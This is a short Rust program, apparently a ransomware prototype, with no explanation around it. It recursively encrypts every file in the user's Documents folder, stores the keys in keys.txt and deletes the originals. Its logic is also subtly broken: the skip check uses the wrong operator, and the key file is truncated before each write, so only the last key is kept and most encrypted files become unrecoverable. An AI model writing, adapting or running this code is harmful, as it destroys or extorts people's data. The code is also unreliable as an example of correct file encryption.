use std::io::Write;
use std::{fs, path::Path};
use std::path::PathBuf;
use anyhow::{Result, Ok};
use orion::aead;
use dirs::document_dir;
use walkdir::WalkDir;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const KEY_FILE_NAME:		&str	= "keys.txt";

type CipherAndKey = (Vec<u8>, aead::SecretKey);

fn main() -> Result<()> {
	let target_dir = document_dir().unwrap();
	let mut keyfile_loc = target_dir.clone();
	keyfile_loc.push(KEY_FILE_NAME);
	let keyfile_loc = keyfile_loc; // make immutable

	let entries = WalkDir::new(target_dir);
	for entry in entries {
		let entry = entry?;
		let path = entry.path();

		if path.is_file() {
			encrypt_file(path, keyfile_loc.as_path())?;
		}
	}

	Ok(())
}

fn encrypt_file(path: &Path, keyfile_loc: &Path) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	// Don't encrypt keyfile or already encrypted files
	if	file_name.ends_with(ENCRYPTED_EXTENSION) &&
		path.canonicalize()? == keyfile_loc.canonicalize()? {
		
		return Ok(())
	}

	let encrypted_path = PathBuf::from(
		format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
	);

	// Prepare new file data
	let content = fs::read(&path)?;
	let (ciphertext, key) = encrypt_xchacha20(&content[..])?;

	// Write encrypted data to new file
	fs::write(&encrypted_path, &ciphertext[..])?;

	// Add key to keyfile, and rm old file
	append_file(keyfile_loc, key.unprotected_as_bytes())?;
	fs::remove_file(&path)?;

	Ok(())
}

fn encrypt_xchacha20(src: &[u8]) -> Result<CipherAndKey> {
	let secret_key = aead::SecretKey::default();
	let ciphertext = aead::seal(&secret_key, src)?;
	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;

	Ok(
		(ciphertext, secret_key)
	)
}

fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> Result<()> {
	fs::write(&path, &[])?;

	let mut file = fs::OpenOptions::new()
		.append(true)
		.create(true)
		.open(&path)?;

	file.write(data)?;

	Ok(())
}
